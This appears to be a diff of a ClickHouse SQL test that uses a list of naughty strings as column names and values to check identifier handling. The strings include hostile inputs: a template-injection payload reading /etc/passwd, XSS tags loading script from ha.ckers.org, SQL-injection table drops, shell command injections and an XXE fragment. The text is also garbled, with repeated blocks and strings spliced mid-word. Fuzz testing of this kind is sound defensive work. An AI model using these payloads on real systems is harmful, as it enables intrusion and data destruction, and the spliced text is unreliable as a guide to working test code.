','­؀؁؂؃؄؅؜۝܏᠎​‌‍‎‏‪‫‬‭‮⁠⁡⁢⁣⁤⁦⁧⁨⁩⁪⁫⁬⁭⁮⁯﻿￹￺￻𑂽𛲠𛲡𛲢𛲣𝅳𝅴𝅵𝅶𝅷𝅸𝅹𝅺󠀁󠀠󠀡󠀢󠀣󠀤󠀥󠀦󠀧󠀨󠀩󠀪󠀫󠀬󠀭󠀮󠀯󠀰󠀱󠀲󠀳󠀴󠀵󠀶󠀷󠀸󠀹󠀺󠀻󠀼󠀽󠀾󠀿󠁀󠁁󠁂󠁃󠁄󠁅󠁆󠁇󠁈󠁉󠁊󠁋󠁌󠁍󠁎󠁏󠁐󠁑󠁒󠁓󠁔󠁕󠁖󠁗󠁘󠁙󠁚󠁛󠁜󠁝󠁞󠁟󠁠󠁡󠁢󠁣󠁤󠁥󠁦󠁧󠁨󠁩󠁪󠁫󠁬󠁭󠁮󠁯󠁰󠁱󠁲󠁳󠁴󠁵󠁶󠁷󠁸󠁹󠁺󠁻󠁼󠁽󠁾󠁿','﻿','￾','Ω≈ç√∫˜µ≤≥÷','åß∂ƒ©˙∆˚¬…æ','œ∑´®†¥¨ˆøπ“‘','¡™£¢∞§¶•ªº–≠','¸˛Ç◊ı˜Â¯˘¿','ÅÍÎÏ˝ÓÔÒÚÆ☃','Œ„´‰ˇÁ¨ˆØ∏”’','`⁄€‹›ﬁﬂ‡°�ЌЍЎЏАБВГДЕЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯабвгдежзийклмнопрстуфхцчшщъыьэюя','٠١٢٣٤٥٦٧٨٩','⁰⁴⁵','₀₁₂','⁰⁴⁵₀₁₂','ด้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้�~��็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็ ด้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็ ด้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้� end up in your dream, but we hope it works. Please wake up, we miss you.','Roses are \\u001b[0;31mred\\u001b[0m, violets are \\u001b[0;34mblue. Hope you enjoy terminal hue','But now...\\u001b[20Cfor my greatest trick...\\u001b[8m','The quic\b\b\b\b\b\bk brown fo\\u0007\\u0007\\u0007\\u0007\\u0007\\u0007\\u0007\\u0007\\u0007\\u0007\\u0007x... [Beeeep]','Powerلُلُصّبُلُلصّبُررً ॣ ॣh ॣ ॣ冗','🏳0🌈️','జ్ఞ‌ా','گچپژ','{% print \'x\' * 64 * 1024**3 %}','{{ "".__class__.__mro__[2].__subclasses__()[40]("/etc/passwd").read() }}' FORMAT PrettyCompactNoEscapes;
+
+SELECT JSONExtract(
+    '{"x": [\n  "", \n  "undefined", \n  "undef", \n  "null", \n  "NULL", \n  "(null)", \n  "nil", \n  "NIL", \n  "true", \n  "false", \n  "True", \n  "False", \n  "TRUE", \n  "FALSE", \n  "None", \n  "hasOwnProperty", \n  "then", \n  "\\\\", \n  "\\\\\\\\", \n  "0", \n  "1", \n  "1.00", \n  "$1.00", \n  "1mushrooms" String,
+  "RomansInSussex.co.uk" String,
+  "http://www.cum.qc.ca/" String,
+  "Craig Cockburn, Software Specialist" String,
+  "Linda Callahan" String,
+  "Dr. Herman I. Libshitz" String,
+  "magna cum laude" String,
+  "Super Bowl XXX" String,
+  "medieval erection of parapets" String,
+  "evaluate" String,
+  "mocha" String,
+  "expression" String,
+  "Arsenal canal" String,
+  "classic" String,
+  "Tyson Gay" String,
+  "Dick Van Dyke" String,
+  "basement" String,
+  "If you're reading this, you've been in a coma for almost 20 years now. We're trying a new technique. We don't know where this message will end up in your dream, but we hope it works. Please wake up, we miss you." String,
+  "Roses are \u001b[0;31mred\u001b[0m, violets are \u001b[0;34mblue. Hope you enjoy terminal hue" String,
+  "But now...\u001b[20Cfor my greatest trick...\u001b[8m" String,
+  "The quic\b\b\b\b\b\bk brown fo\u0007\u0007\u0007\u0007\u0007\u0007\u0007\u0007\u0007\u0007\u0007x... [Beeeep]" String,
+  "Powerلُلُصّبُلُلصّبُررً ॣ ॣh ॣ ॣ冗" String,
+  "🏳0🌈️" String,
+  "జ్ఞ‌ా" String,
+  "گچپژ" String,
+  "{% print 'x' * 64 * 1024**3 %}" String,
+  "{{ \"\".__class__.__mro__[2].__subclasses__()[40](\"/etc/passwd\").read() }}" String
+) ENGINE = MergeTree ORDER BY "{{ \"\".__class__.__mro__[2].__subclasses__()[40](\"/etc/passwd\").read() }}" SETTINGS min_bytes_for_wide_part = '100G';
+
+INSERT INTO test ("0") SELECT 'Hello, world!';
+SELECT count() FROM test;
+
+DETACH TABLE test;
+ATTACH TABLE test;
+
+SELECT count() FROM test;
+
+INSERT INTO test ("0") VALUES ('Hello, world!');
+SELECT count() FROM test;
+
+DROP TABLE IF EXISTS test_r1;
+DROP TABLE IF EXISTS test_r2;
+
+CREATE TABLE test_r1 AS test ENGINE = ReplicatedMergeTree('/clickhouse/{database}/test_01666', 'r1') ORDER BY "\\" SETTINGS min_bytes_for_wide_part = '100G';
+INSERT INTO test_r1 SELECT * FROM test;
+CREATE TABLE test_r2 AS test ENGINE = ReplicatedMergeTree('/clickhouse/{database}/test_01666', 'r2') ORDER BY "\\" SETTINGS min_bytes_for_wide_part = '100G';
+
+SYSTEM SYNC REPLICA test_r2;
+
+SELECT count() FROM test_r1;
+SELECT count() FROM test_r2;
+
+DROP TABLE test_r1;
+DROP TABLE test_r2;
+
+SELECT groupArray(name) FROM system.columns WHERE database = currentDatabase() AND table = 'test';
+
+DROP TABLE test;
+
+SELECT 'undefined','undef','null','NULL','(null)','nil','NIL','true','false','True','False','TRUE','FALSE','None','hasOwnProperty','then','\\','\\\\','0','1','1.00','$1.00','1/2','1E2','1E02','1E+02','-1','-1.00','-$1.00','-1/2','-1E2','-1E02','-1E+02','1/0','0/0','-2147483648/-1','-9223372036854775808/-1','-0','-0.0','+0','+0.0','0.00','0..0','.','0.0.0','0,00','0,,0',',','0,0,0','0.0/0','1.0/0.0','0.0/0.0','1,0/0,0','0,0/0,0','--1','-','-.','-,','999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999','NaN','Infinity','-Infinity','INF','1#INF','-1#IND','1#QNAN','1#SNAN','1#IND','0x0','0xffffffff','0xff����ffffffffff','0xabad1dea','123456789012345678901234567890123456789','1,000.00','1 000.00','1\'000.00','1,000,000.00','1 000 000.00','1\'000\'000.00','1.000,00','1 000,00','1\'000,00','1.000.000,00','1 000 000,00','1\'000\'000,00','01000','08','09','2.2250738585072011e-308',',./;\'[]\\-=','<>?:"{}|_+','!@#$%^&*()`~','\\u0001\\u0002\\u0003\\u0004\\u0005\\u0006\\u0007\b\\u000e\\u000f\\u0010\\u0011\\u0012\\u0013\\u0014\\u0015\\u0016\\u0017\\u0018\\u0019\\u001a\\u001b\\u001c\\u001d\\u001e\\u001f','','\t\\u000b\f              ​    　','­؀؁؂؃؄؅؜۝܏᠎​‌‍‎‏‪‫‬‭‮⁠⁡⁢⁣⁤⁦⁧⁨⁩⁪⁫⁬⁭⁮⁯﻿￹￺￻𑂽𛲠𛲡𛲢𛲣𝅳𝅴𝅵𝅶𝅷𝅸𝅹𝅺󠀁󠀠󠀡󠀢󠀣󠀤󠀥󠀦󠀧󠀨󠀩󠀪󠀫󠀬󠀭󠀮󠀯󠀰󠀱󠀲󠀳󠀴󠀵󠀶󠀷󠀸󠀹󠀺󠀻󠀼󠀽󠀾󠀿󠁀󠁁󠁂󠁃󠁄󠁅󠁆󠁇󠁈󠁉󠁊󠁋󠁌󠁍󠁎󠁏󠁐󠁑󠁒󠁓󠁔󠁕󠁖󠁗󠁘󠁙󠁚󠁛󠁜󠁝󠁞󠁟󠁠󠁡󠁢󠁣󠁤󠁥󠁦󠁧󠁨󠁩󠁪󠁫󠁬󠁭󠁮󠁯󠁰󠁱󠁲󠁳󠁴󠁵󠁶󠁷󠁸󠁹󠁺󠁻󠁼󠁽󠁾󠁿','﻿','￾','Ω≈ç√∫˜µ≤≥÷','åß∂ƒ©˙∆˚¬…æ','œ∑´®†¥¨ˆøπ“‘','¡™£¢∞§¶•ªº–≠','¸˛Ç◊ı˜Â¯˘¿','ÅÍÎÏ˝ÓÔÒÚÆ☃','Œ„´‰ˇÁ¨ˆØ∏”’','`⁄€‹›ﬁﬂ‡°�ЌЍЎЏАБВГДЕЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯабвгдежзийклмнопрстуфхцчшщъыьэюя','٠١٢٣٤٥٦٧٨٩','⁰⁴⁵','₀₁₂','⁰⁴⁵₀₁₂','ด้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้�~��็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็ ด้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็ ด้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้� end up in your dream, but we hope it works. Please w000,00','1 000 000,00','1\'000\'000,00','01000','08','09','2.2250738585072011e-308',',./;\'[]\\-=','<>?:"{}|_+','!@#$%^&*()`~','\b','','\t\f              ​    　','­؀؁؂؃؄؅؜۝܏᠎​‌‍‎‏‪‫‬‭‮⁠⁡⁢⁣⁤⁦⁧⁨⁩⁪⁫⁬⁭⁮⁯﻿￹￺￻𑂽𛲠𛲡𛲢𛲣𝅳𝅴𝅵𝅶𝅷𝅸𝅹𝅺󠀁󠀠󠀡󠀢󠀣󠀤󠀥󠀦󠀧󠀨󠀩󠀪󠀫󠀬󠀭󠀮󠀯󠀰󠀱󠀲󠀳󠀴󠀵󠀶󠀷󠀸󠀹󠀺󠀻󠀼󠀽󠀾󠀿󠁀󠁁󠁂󠁃󠁄󠁅󠁆󠁇󠁈󠁉󠁊󠁋󠁌󠁍󠁎󠁏󠁐󠁑󠁒󠁓󠁔󠁕󠁖󠁗󠁘󠁙󠁚󠁛󠁜󠁝󠁞󠁟󠁠󠁡󠁢󠁣󠁤󠁥󠁦󠁧󠁨󠁩󠁪󠁫󠁬󠁭󠁮󠁯󠁰󠁱󠁲󠁳󠁴󠁵󠁶󠁷󠁸󠁹󠁺󠁻󠁼󠁽󠁾󠁿','﻿','￾','Ω≈ç√∫˜µ≤≥÷','åß∂ƒ©˙∆˚¬…æ','œ∑´®†¥¨ˆøπ“‘','¡™£¢∞§¶•ªº–≠','¸˛Ç◊ı˜Â¯˘¿','ÅÍÎÏ˝ÓÔÒÚÆ☃','Œ„´‰ˇÁ¨ˆØ∏”’','`⁄€‹›ﬁﬂ‡°·‚—±','⅛⅜⅝⅞','ЁЂЃЄЅІЇЈЉЊЋЌЍЎЏАБВГДЕЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯабвгдежзийклмнопрстуфхцчшщъыьэюя','٠١٢٣٤٥٦٧٨٩','⁰⁴⁵','₀₁₂','⁰⁴⁵₀₁₂','ด้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้�horpe General Hospital" String,
+  "Penistone Community Church" String,
+  "Lightwater Country Park" String,
+  "Jimmy Clitheroe" String,
+  "Horniman Museum" String,
+  "shitake mushrooms" String,
+  "RomansInSussex.co.uk" String,
+  "http://www.cum.qc.ca/" String,
+  "Craig Cockburn, Software Specialist" String,
+  "Linda Callahan" String,
+  "Dr. Herman I. Libshitz" String,
+  "magna cum laude" String,
+  "Super Bowl XXX" String,
+  "medieval erection of parapets" String,
+  "evaluate" String,
+  "mocha" String,
+  "expression" String,
+  "Arsenal canal" String,
+  "classic" String,
+  "Tyson Gay" String,
+  "Dick Van Dyke" String,
+  "basement" String,
+  "If you're reading this, you've been in a coma for almost 20 years now. We're trying a new technique. We don't know where this message will end up in your dream, but we hope it works. Please wake up, we miss you." String,
+  "Roses are \u001b[0;31mred\u001b[0m, violets are \u001b[0;34mblue. Hope you enjoy terminal hue" String,
+  "But now...\u001b[20Cfor my greatest trick...\u001b[8m" String,
+  "The quic\b\b\b\b\b\bk brown fo\u0007\u0007\u0007\u0007\u0007\u0007\u0007\u0007\u0007\u0007\u0007x... [Beeeep]" String,
+  "Powerلُلُصّبُلُلصّبُررً ॣ ॣh ॣ ॣ冗" String,
+  "🏳0🌈️" String,
+  "జ్ఞ‌ా" String,
+  "گچپژ" String,
+  "{% print 'x' * 64 * 1024**3 %}" String,
+  "{{ \"\".__class__.__mro__[2].__subclasses__()[40](\"/etc/passwd\").read() }}" String
+) ENGINE = MergeTree ORDER BY "{{ \"\".__class__.__mro__[2].__subclasses__()[40](\"/etc/passwd\").read() }}" SETTINGS min_bytes_for_wide_part = '100G';
+
+INSERT INTO test ("0") SELECT 'Hello, world!';
+SELECT count() FROM test;
+
+DETACH TABLE test;
+ATTACH TABLE test;
+
+SELECT count() FROM test;
+
+INSERT INTO test ("0") VALUES ('Hello, world!');
+SELECT count() FROM test;
+
+DROP TABLE IF EXISTS test_r1;
+DROP TABLE IF EXISTS test_r2;
+
+CREATE TABLE test_r1 AS test ENGINE = ReplicatedMergeTree('/clickhouse/{database}/test_01666', 'r1') ORDER BY "\\" SETTINGS min_bytes_for_wide_part = '100G';
+INSERT INTO test_r1 SELECT * FROM test;
+CREATE TABLE test_r2 AS test ENGINE = ReplicatedMergeTree('/clickhouse/{database}/test_01666', 'r2') ORDER BY "\\" SETTINGS min_bytes_for_wide_part = '100G';
+
+SYSTEM SYNC REPLICA test_r2;
+
+SELECT count() FROM test_r1;
+SELECT count() FROM test_r2;
+
+DROP TABLE test_r1;
+DROP TABLE test_r2;
+
+SELECT groupArray(name) FROM system.columns WHERE database = currentDatabase() AND table = 'test';
+
+DROP TABLE test;
+
+SELECT 'undefined','undef','null','NULL','(null)','nil','NIL','true','false','True','False','TRUE','FALSE','None','hasOwnProperty','then','\\','\\\\','0','1','1.00','$1.00','1/2','1E2','1E02','1E+02','-1','-1.00','-$1.00','-1/2','-1E2','-1E02','-1E+02','1/0','0/0','-2147483648/-1','-9223372036854775808/-1','-0','-0.0','+0','+0.0','0.00','0..0','.','0.0.0','0,00','0,,0',',','0,0,0','0.0/0','1.0/0.0','0.0/0.0','1,0/0,0','0,0/0,0','--1','-','-.','-,','999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999','NaN','Infinity','-Infinity','INF','1#INF','-1#IND','1#QNAN','1#SNAN','1#IND','0x0','0xffffffff','0xff����ffffffffff','0xabad1dea','123456789012345678901234567890123456789','1,000.00','1 000.00','1\'000.00','1,000,000.00','1 000 000.00','1\'000\'000.00','1.000,00','1 000,00','1\'000,00','1.000.000,00','1 000 000,00','1\'000\'000,00','01000','08','09','2.2250738585072011e-308',',./;\'[]\\-=','<>?:"{}|_+','!@#$%^&*()`~','\\u0001\\u0002\\u0003\\u0004\\u0005\\u0006\\u0007\b\\u000e\\u000f\\u0010\\u0011\\u0012\\u0013\\u0014\\u0015\\u0016\\u0017\\u0018\\u0019\\u001a\\u001b\\u001c\\u001d\\u001e\\u001f','','\t\\u000b\f              ​    　','­؀؁؂؃؄؅؜۝܏᠎​‌‍‎‏‪‫‬‭‮⁠⁡⁢⁣⁤⁦⁧⁨⁩⁪⁫⁬⁭⁮⁯﻿￹￺￻𑂽𛲠𛲡𛲢𛲣𝅳𝅴𝅵𝅶𝅷𝅸𝅹𝅺󠀁󠀠󠀡󠀢󠀣󠀤󠀥󠀦󠀧󠀨󠀩󠀪󠀫󠀬󠀭󠀮󠀯󠀰󠀱󠀲󠀳󠀴󠀵󠀶󠀷󠀸󠀹󠀺󠀻󠀼󠀽󠀾󠀿󠁀󠁁󠁂󠁃󠁄󠁅󠁆󠁇󠁈󠁉󠁊󠁋󠁌󠁍󠁎󠁏󠁐󠁑󠁒󠁓󠁔󠁕󠁖󠁗󠁘󠁙󠁚󠁛󠁜󠁝󠁞󠁟󠁠󠁡󠁢󠁣󠁤󠁥󠁦󠁧󠁨󠁩󠁪󠁫󠁬󠁭󠁮󠁯󠁰󠁱󠁲󠁳󠁴󠁵󠁶󠁷󠁸󠁹󠁺󠁻󠁼󠁽󠁾󠁿','﻿','￾','Ω≈ç√∫˜µ≤≥÷','åß∂ƒ©˙∆˚¬…æ','œ∑´®†¥¨ˆøπ“‘','¡™£¢∞§¶•ªº–≠','¸˛Ç◊ı˜Â¯˘¿','ÅÍÎÏ˝ÓÔÒÚÆ☃','Œ„´‰ˇÁ¨ˆØ∏”’','`⁄€‹›ﬁﬂ‡°�ЌЍЎЏАБВГДЕЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯабвгдежзийклмнопрстуфхцчшщъыьэюя','٠١٢٣٤٥٦٧٨٩','⁰⁴⁵','₀₁₂','⁰⁴⁵₀₁₂','ด้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้�~��็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็ ด้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็ ด้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้� end up in your dream, but we hope it works. Please wake up, we miss you.','Roses are \\u001b[0;31mred\\u001b[0m, violets are \\u001b[0;34mblue. Hope you enjoy terminal hue','But now...\\u001b[20Cfor my greatest trick...\\u001b[8m','The quic\b\b\b\b\b\bk brown fo\\u0007\\u0007\\u0007\\u0007\\u0007\\u0007\\u0007\\u0007\\u0007\\u0007\\u0007x... [Beeeep]','Powerلُلُصّبُلُلصّبُررً ॣ ॣh ॣ ॣ冗','🏳0🌈️','జ్ఞ‌ా','گچپژ','{% print \'x\' * 64 * 1024**3 %}','{{ "".__class__.__mro__[2].__subclasses__()[40]("/etc/passwd").read() }}' FORMAT PrettyCompactNoEscapes;
+
+SELECT JSONExtract(
+    '{"x": [\n  "", \n  "undefined", \n  "undef", \n  "null", \n  "NULL", \n  "(null)", \n  "nil", \n  "NIL", \n  "true", \n  "false", \n  "True", \n  "False", \n  "TRUE", \n  "FALSE", \n  "None", \n  "hasOwnProperty", \n  "then", \n  "\\\\", \n  "\\\\\\\\", \n  "0", \n  "1", \n  "1.00", \n  "$1.00", \n  "1mushrooms" String,
+  "RomansInSussex.co.uk" String,
+  "http://www.cum.qc.ca/" String,
+  "Craig Cockburn, Software Specialist" String,
+  "Linda Callahan" String,
+  "Dr. Herman I. Libshitz" String,
+  "magna cum laude" String,
+  "Super Bowl XXX" String,
+  "medieval erection of parapets" String,
+  "evaluate" String,
+  "mocha" String,
+  "expression" String,
+  "Arsenal canal" String,
+  "classic" String,
+  "Tyson Gay" String,
+  "Dick Van Dyke" String,
+  "basement" String,
+  "If you're reading this, you've been in a coma for almost 20 years now. We're trying a new technique. We don't know where this message will end up in your dream, but we hope it works. Please wake up, we miss you." String,
+  "Roses are \u001b[0;31mred\u001b[0m, violets are \u001b[0;34mblue. Hope you enjoy terminal hue" String,
+  "But now...\u001b[20Cfor my greatest trick...\u001b[8m" String,
+  "The quic\b\b\b\b\b\bk brown fo\u0007\u0007\u0007\u0007\u0007\u0007\u0007\u0007\u0007\u0007\u0007x... [Beeeep]" String,
+  "Powerلُلُصّبُلُلصّبُررً ॣ ॣh ॣ ॣ冗" String,
+  "🏳0🌈️" String,
+  "జ్ఞ‌ా" String,
+  "گچپژ" String,
+  "{% print 'x' * 64 * 1024**3 %}" String,
+  "{{ \"\".__class__.__mro__[2].__subclasses__()[40](\"/etc/passwd\").read() }}" String
+) ENGINE = MergeTree ORDER BY "{{ \"\".__class__.__mro__[2].__subclasses__()[40](\"/etc/passwd\").read() }}" SETTINGS min_bytes_for_wide_part = '100G';
+
+INSERT INTO test ("0") SELECT 'Hello, world!';
+SELECT count() FROM test;
+
+DETACH TABLE test;
+ATTACH TABLE test;
+
+SELECT count() FROM test;
+
+INSERT INTO test ("0") VALUES ('Hello, world!');
+SELECT count() FROM test;
+
+DROP TABLE IF EXISTS test_r1;
+DROP TABLE IF EXISTS test_r2;
+
+CREATE TABLE test_r1 AS test ENGINE = ReplicatedMergeTree('/clickhouse/{database}/test_01666', 'r1') ORDER BY "\\" SETTINGS min_bytes_for_wide_part = '100G';
+INSERT INTO test_r1 SELECT * FROM test;
+CREATE TABLE test_r2 AS test ENGINE = ReplicatedMergeTree('/clickhouse/{database}/test_01666', 'r2') ORDER BY "\\" SETTINGS min_bytes_for_wide_part = '100G';
+
+SYSTEM SYNC REPLICA test_r2;
+
+SELECT count() FROM test_r1;
+SELECT count() FROM test_r2;
+
+DROP TABLE test_r1;
+DROP TABLE test_r2;
+
+SELECT groupArray(name) FROM system.columns WHERE database = currentDatabase() AND table = 'test';
+
+DROP TABLE test;
+
+SELECT 'undefined','undef','null','NULL','(null)','nil','NIL','true','false','True','False','TRUE','FALSE','None','hasOwnProperty','then','\\','\\\\','0','1','1.00','$1.00','1/2','1E2','1E02','1E+02','-1','-1.00','-$1.00','-1/2','-1E2','-1E02','-1E+02','1/0','0/0','-2147483648/-1','-9223372036854775808/-1','-0','-0.0','+0','+0.0','0.00','0..0','.','0.0.0','0,00','0,,0',',','0,0,0','0.0/0','1.0/0.0','0.0/0.0','1,0/0,0','0,0/0,0','--1','-','-.','-,','999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999','NaN','Infinity','-Infinity','INF','1#INF','-1#IND','1#QNAN','1#SNAN','1#IND','0x0','0xffffffff','0xff����ffffffffff','0xabad1dea','123456789012345678901234567890123456789','1,000.00','1 000.00','1\'000.00','1,000,000.00','1 000 000.00','1\'000\'000.00','1.000,00','1 000,00','1\'000,00','1.000.000,00','1 000 000,00','1\'000\'000,00','01000','08','09','2.2250738585072011e-308',',./;\'[]\\-=','<>?:"{}|_+','!@#$%^&*()`~','\\u0001\\u0002\\u0003\\u0004\\u0005\\u0006\\u0007\b\\u000e\\u000f\\u0010\\u0011\\u0012\\u0013\\u0014\\u0015\\u0016\\u0017\\u0018\\u0019\\u001a\\u001b\\u001c\\u001d\\u001e\\u001f','','\t\\u000b\f              ​    　','­؀؁؂؃؄؅؜۝܏᠎​‌‍‎‏‪‫‬‭‮⁠⁡⁢⁣⁤⁦⁧⁨⁩⁪⁫⁬⁭⁮⁯﻿￹￺￻𑂽𛲠𛲡𛲢𛲣𝅳𝅴𝅵𝅶𝅷𝅸𝅹𝅺󠀁󠀠󠀡󠀢󠀣󠀤󠀥󠀦󠀧󠀨󠀩󠀪󠀫󠀬󠀭󠀮󠀯󠀰󠀱󠀲󠀳󠀴󠀵󠀶󠀷󠀸󠀹󠀺󠀻󠀼󠀽󠀾󠀿󠁀󠁁󠁂󠁃󠁄󠁅󠁆󠁇󠁈󠁉󠁊󠁋󠁌󠁍󠁎󠁏󠁐󠁑󠁒󠁓󠁔󠁕󠁖󠁗󠁘󠁙󠁚󠁛󠁜󠁝󠁞󠁟󠁠󠁡󠁢󠁣󠁤󠁥󠁦󠁧󠁨󠁩󠁪󠁫󠁬󠁭󠁮󠁯󠁰󠁱󠁲󠁳󠁴󠁵󠁶󠁷󠁸󠁹󠁺󠁻󠁼󠁽󠁾󠁿','﻿','￾','Ω≈ç√∫˜µ≤≥÷','åß∂ƒ©˙∆˚¬…æ','œ∑´®†¥¨ˆøπ“‘','¡™£¢∞§¶•ªº–≠','¸˛Ç◊ı˜Â¯˘¿','ÅÍÎÏ˝ÓÔÒÚÆ☃','Œ„´‰ˇÁ¨ˆØ∏”’','`⁄€‹›ﬁﬂ‡°�ЌЍЎЏАБВГДЕЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯабвгдежзийклмнопрстуфхцчшщъыьэюя','٠١٢٣٤٥٦٧٨٩','⁰⁴⁵','₀₁₂','⁰⁴⁵₀₁₂','ด้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้�~��็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็ ด้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็ ด้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้� end up in your dream, but we hope it works. Please w000,00','1 000 000,00','1\'000\'000,00','01000','08','09','2.2250738585072011e-308',',./;\'[]\\-=','<>?:"{}|_+','!@#$%^&*()`~','\b','','\t\f              ​    　','­؀؁؂؃؄؅؜۝܏᠎​‌‍‎‏‪‫‬‭‮⁠⁡⁢⁣⁤⁦⁧⁨⁩⁪⁫⁬⁭⁮⁯﻿￹￺￻𑂽𛲠𛲡𛲢𛲣𝅳𝅴𝅵𝅶𝅷𝅸𝅹𝅺󠀁󠀠󠀡󠀢󠀣󠀤󠀥󠀦󠀧󠀨󠀩󠀪󠀫󠀬󠀭󠀮󠀯󠀰󠀱󠀲󠀳󠀴󠀵󠀶󠀷󠀸󠀹󠀺󠀻󠀼󠀽󠀾󠀿󠁀󠁁󠁂󠁃󠁄󠁅󠁆󠁇󠁈󠁉󠁊󠁋󠁌󠁍󠁎󠁏󠁐󠁑󠁒󠁓󠁔󠁕󠁖󠁗󠁘󠁙󠁚󠁛󠁜󠁝󠁞󠁟󠁠󠁡󠁢󠁣󠁤󠁥󠁦󠁧󠁨󠁩󠁪󠁫󠁬󠁭󠁮󠁯󠁰󠁱󠁲󠁳󠁴󠁵󠁶󠁷󠁸󠁹󠁺󠁻󠁼󠁽󠁾󠁿','﻿','￾','Ω≈ç√∫˜µ≤≥÷','åß∂ƒ©˙∆˚¬…æ','œ∑´®†¥¨ˆøπ“‘','¡™£¢∞§¶•ªº–≠','¸˛Ç◊ı˜Â¯˘¿','ÅÍÎÏ˝ÓÔÒÚÆ☃','Œ„´‰ˇÁ¨ˆØ∏”’','`⁄€‹›ﬁﬂ‡°·‚—±','⅛⅜⅝⅞','ЁЂЃЄЅІЇЈЉЊЋЌЍЎЏАБВГДЕЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯабвгдежзийклмнопрстуфхцчшщъыьэюя','٠١٢٣٤٥٦٧٨٩','⁰⁴⁵','₀₁₂','⁰⁴⁵₀₁₂','ด้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็ ด้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็ ด้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็','\'','"','\'\'','""','\'"\'','"\'\'\'\'"\'"','"\'"\'"\'\'\'\'"','<foo val=“bar” />','<foo val=“bar” />','<foo val=”bar“ />','<foo val=`bar\' />','田中さんにあげて下さい','パーティーへ行かないか','和製漢語','部落格','사회과학원 어학연구소','찦차를 타고 온 펲시맨과 쑛다리 똠방각하','社會科學院語學研究所','울란바토르','𠜎𠜱𠝹𠱓𠱸𠲖𠳏','𐐜 𐐔𐐇𐐝𐐀𐐡𐐇𐐓 𐐙𐐊𐐡𐐝𐐓/𐐝𐐇𐐗𐐊𐐤𐐔 𐐒𐐋𐐗 𐐒𐐌 𐐜 𐐡𐐀𐐖�&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>','<IMG SRC="jav   ascript:alert(\'XSS\');">','<IMG SRC="jav&#x09;ascript:alert(\'XSS\');">','<IMG SRC="jav&#x0A;ascript:alert(\'XSS\');">','<IMG SRC="jav&#x0D;ascript:alert(\'XSS\');">','perl -e \'print "<IMG SRC=java\\0script:alert(\\"XSS\\")>";\' > out','<IMG SRC=" &#14;  javascript:alert(\'XSS\');">','<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>','<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert("XSS")>','<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>','<<SCRIPT>alert("XSS");//<</SCRIPT>','<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >','<SCRIPT SRC=//ha.ckers.org/.j>','<IMG SRC="javascript:alert(\'XSS\')"','<iframe src=http://ha.ckers.org/scriptlet.html <','\\";alert(\'XSS\');//','<u oncopy=alert()> Copy me</u>','<i onwheel=alert(1)> Scroll over me </i>','<plaintext>','http://a/%%30%30','</textarea><script>alert(123)</script>','1;DROP TABLE users','1\'; DROP TABLE users-- 1','\' OR 1=1 -- 1','\' OR \'1\'=\'1','\'; EXEC sp_MSForEachTable \'DROP TABLE ?\'; --',' ','%','_','-','--','--version','--help','$USER','/dev/null; touch /tmp/blns.fail ; echo','`touch /tmp/blns.fail`','$(touch /tmp/blns.fail)','@{[system "touch /tmp/blns.fail"]}','eval("puts \'hello world\'")','System("ls -al /")','`ls -al /`','Kernel.exec("ls -al /")','Kernel.exit(1)','%x(\'ls -al /\')','<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM 